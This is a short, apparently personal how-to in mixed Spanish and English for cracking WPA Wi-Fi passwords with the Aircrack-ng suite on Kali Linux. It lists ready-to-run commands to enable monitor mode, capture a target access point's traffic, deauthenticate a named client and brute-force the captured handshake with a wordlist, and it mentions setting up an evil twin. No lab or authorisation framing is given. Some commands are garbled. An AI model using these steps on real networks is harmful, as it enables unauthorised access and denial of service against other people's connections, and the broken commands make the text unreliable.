<img src="https://www.aircrack-ng.org/resources/aircrack-ng-new-logo.jpg" align=right>

# How to use Aircrack-ng for wireless cracking

_Note: This HowTo was created to be used in Kali Linux so we assume no liability regarding the bad results or any other issues when used in Windows._


#### PASO 1: Poner modo promiscuo la interfaz wireless 
_Manera #1_ Siga estos pasos:
> * sudo ifconfig wlan0 down
> * sudo ifconfig wlan0 mode monitor
> * sudo ifconfig wlan0 up

_Manera #2_ Siga estos pasos:
> * sudo wlan0 down
> * sudo airm# on-ng start wlan0
> * airmon-ng check kill (this will check and kill off processes that might interfere with the aircrack-ng suite.)


#PASO 2: Reconocer las redes disponibles

Digite el comando
> * sudo airodump-ng wlan0mon

#PASO 3: Escuchar por wlan0 el tráfico del AP y ver los dispositivos conectados 

_Terminología importante:_
* -bssid MAC del ssid de la red
* -c canal de esta

sudo airodump-ng --channel 2 --bssid 58:EF:68:A3:E3:D3 --write psk wlan0mon

#segunda forma de hacer esto
sudo airodump-ng --write captureone --output-format cap --bssid 58:EF:68:A3:E3:D3 --channel 2 wlan0mon


#PASO 4: Desautenticar dispositivos pegados a una red. [-0 number deauth packs send; -a AP MAC add; -c device MAC add]
sudo aireplay-ng -0 5 -a 58:EF:68:A3:E3:D3 -c E8:50:8B:95:96:F1 wlan0mon

#PASO 5: Usar aircrack para descifrar el PSK de WPA
aircrack-ng -w rockyou2.txt captureone-01.cap  


#Adicional: para descifrar los paquetes capturados.
sudo airdecap-ng -e 'the ssid' -p passphrase  tkip.cap

#------------------------------------------------------------------------------------------
#Para generar un evil twin se usa airbase-ng
